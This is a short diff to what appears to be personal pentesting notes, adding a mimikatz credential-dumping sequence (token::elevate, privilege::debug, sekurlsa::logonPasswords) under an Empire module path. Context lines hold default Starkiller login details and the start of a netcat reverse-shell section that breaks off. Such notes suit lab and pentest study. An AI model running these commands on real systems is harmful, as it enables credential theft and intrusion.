@@ -22,6 +22,16 @@ https://github.com/BC-SECURITY/Starkiller
   - uri: 127.0.0.1:1337
   - user: empireadmin
   - pass: password123
+  
+```
+powershell/credentials/mimikatz/command
+
+token::elevate
+privilege::debug
+sekurlsa::logonPasswords
+
+```
+
 #### nc reverce
 on target
 ```
